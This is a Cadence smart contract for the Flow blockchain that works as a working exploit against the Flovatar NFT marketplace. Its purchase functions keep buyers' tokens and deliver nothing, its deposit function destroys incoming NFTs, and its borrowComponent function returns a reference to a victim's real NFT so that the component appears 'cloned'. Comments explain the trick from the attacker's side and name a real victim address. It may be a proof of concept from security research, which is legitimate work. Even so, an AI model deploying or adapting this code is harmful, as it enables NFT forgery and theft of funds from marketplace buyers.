import FlovatarMarketplace from 0x921ea449dffec68a
import FlovatarComponent from 0x921ea449dffec68a
import Flovatar from 0x921ea449dffec68a
import FlowToken from 0x1654653399040a61
import FungibleToken from 0xf233dcee88fe0abe
import NonFungibleToken from 0x1d7e57aa55817448
import FlovatarComponentTemplate from 0x921ea449dffec68a

pub contract Marketplace {

    pub var userAddress : Address?

    pub var price : UFix64?

    pub var FlovatarComponentIDs : [UInt64]

    pub resource Collection : FlovatarMarketplace.SalePublic {

        pub fun purchaseFlovatar(tokenId: UInt64, recipientCap: Capability<&{Flovatar.CollectionPublic}>, buyTokens: @FungibleToken.Vault){
            let ref = Marketplace.account.borrow<&FlowToken.Vault{FungibleToken.Receiver}>(from: /storage/flowTokenVault)!

            ref.deposit(from: <- buyTokens)
        }

        pub fun purchaseFlovatarComponent(tokenId: UInt64, recipientCap: Capability<&{FlovatarComponent.CollectionPublic}>, buyTokens: @FungibleToken.Vault){
            let ref = Marketplace.account.borrow<&FlowToken.Vault{FungibleToken.Receiver}>(from: /storage/flowTokenVault)!

            ref.deposit(from: <- buyTokens)
        }

        pub fun getFlovatarPrice(tokenId: UInt64): UFix64? {
            return nil
        }
        
        // required
        pub fun getFlovatarComponentPrice(tokenId: UInt64): UFix64? {
            return Marketplace.price
        }

        pub fun getFlovatarIDs(): [UInt64] {
            return []
        }

        // required
        pub fun getFlovatarComponentIDs(): [UInt64]{
            return Marketplace.FlovatarComponentIDs
        }

        pub fun getFlovatar(tokenId: UInt64): &{Flovatar.Public}? {
            return nil
        }

        // required
        pub fun getFlovatarComponent(tokenId: UInt64): &{FlovatarComponent.Public}? {

            let ref = Marketplace.account.borrow<&{FlovatarComponent.Public}>(from: /storage/peachTea)!

            return ref
        }
    }

    pub resource ComponentPublic : FlovatarComponent.Public {
        
        // required
        pub let templateId: UInt64

        // required
        pub let mint: UInt64

        pub let id: UInt64
        
        pub fun getTemplate(): FlovatarComponentTemplate.ComponentTemplateData {
            return FlovatarComponentTemplate.ComponentTemplateData(
            id: 0,
            name: "",
            category: "",
            color: "",
            description: "",
            svg: nil,
            series: 0,
            maxMintableComponents: 0,
            rarity: "")
        }

        pub fun getSvg(): String {
            return ""
        }

        pub fun getCategory(): String {
            return ""
        }

        pub fun getSeries(): UInt32 {
            return 0
        }

        pub fun getRarity(): String {
            return ""
        }

        pub fun isBooster(rarity: String): Bool {
            return true
        }

        pub fun checkCategorySeries(category: String, series: UInt32): Bool {
            return true
        }

        pub let name: String
        pub let description: String
        pub let schema: String?

        init(templateId : UInt64 ,mint : UInt64) {
            self.id = 0
            self.templateId = templateId // arbitrary value
            self.mint = mint // arbitrary value
            self.name = ""
            self.description = ""
            self.schema = nil
        }
    }
    
    access(account) fun createNewComponentPublic(templateId: UInt64, mint: UInt64) {
        let old_res <- self.account.load<@AnyResource>(from: /storage/peachTea)!
        destroy old_res
        let new_res <- create ComponentPublic(templateId: templateId, mint: mint)
        self.account.save(<- new_res, to: /storage/peachTea)
    }

    pub resource ComponentResource : FlovatarComponent.CollectionPublic {
        pub fun deposit(token: @NonFungibleToken.NFT) {
            destroy token
        }
        
        pub fun getIDs(): [UInt64] {
            return []
        }

        pub fun borrowNFT(id: UInt64): &NonFungibleToken.NFT {
            panic("todo")
        }

        // required
        pub fun borrowComponent(id: UInt64): &FlovatarComponent.NFT? {

            /*
            
            Although we cannot return arbitrary values here, we can "borrow" the victim's NFT to return the required value.

            This can be done by borrowing FlovatarComponent.CollectionPublicPath and gaining a resource reference that implements the CollectionPublic interface
 
            // A.921ea449dffec68a.FlovatarComponent:243

            pub resource interface CollectionPublic {
                pub fun borrowComponent(id: UInt64): &FlovatarComponent.NFT? {
                    // If the result isn't nil, the id of the returned reference
                    // should be the same as the argument to the function
                    post {
                        (result == nil) || (result?.id == id):
                            "Cannot borrow Component reference: The ID of the returned reference is incorrect"
                    }
                }
            }

            We can then call borrowComponent to get the reference and return it

            A small hassle on the attacker side is they need to find out which user owns the NFT they want to replicate.

            */

            let userAddress = getAccount(Marketplace.userAddress!)
            let collection_ref = userAddress.getCapability<&FlovatarComponent.Collection>(FlovatarComponent.CollectionPublicPath).borrow()!
            let nft_ref = collection_ref.borrowComponent(id: id)
            nft_ref! // confirm user has the nft we want
            return nft_ref
        }
    }

    // to update which user address we "borrow" the NFT from
    access(self) fun updateMarketplace(userAddress : Address?, price : UFix64? , FlovatarComponentIDs: [UInt64]) {
        self.userAddress = userAddress
        self.price = price
        self.FlovatarComponentIDs = FlovatarComponentIDs
    }

    pub resource Admin {
        pub fun updatePrice(price: UFix64) {
            Marketplace.price = price
        }
    }

    pub fun setupAdmin() {
        if self.account.borrow<&Admin>(from: /storage/admin) == nil {
            self.account.save(<- create Admin(), to: /storage/admin)
        }        
    }

    init() {

        /*
        
        NFT to clone: https://flovatar.com/components/112502/0xc23d41bdf4e4587d

        Result: https://flovatar.com/components/112502/0x079960b40a947dbf

        */

        self.userAddress = 0xc23d41bdf4e4587d
        self.price = 1337.0
        self.FlovatarComponentIDs = []

        self.account.save(<- create ComponentPublic(templateId: 753, mint: 56), to: /storage/peachTea)

        self.account.save(<- create Collection(), to: FlovatarMarketplace.CollectionStoragePath)

        self.account.link<&{FlovatarMarketplace.SalePublic}>(FlovatarMarketplace.CollectionPublicPath, target: FlovatarMarketplace.CollectionStoragePath)

        self.account.save(<- create ComponentResource(), to: FlovatarComponent.CollectionStoragePath)

        self.account.link<&{FlovatarComponent.CollectionPublic}>(FlovatarComponent.CollectionPublicPath, target: FlovatarComponent.CollectionStoragePath)

        self.account.save(<- create Admin(), to: /storage/admin)
    }
}
 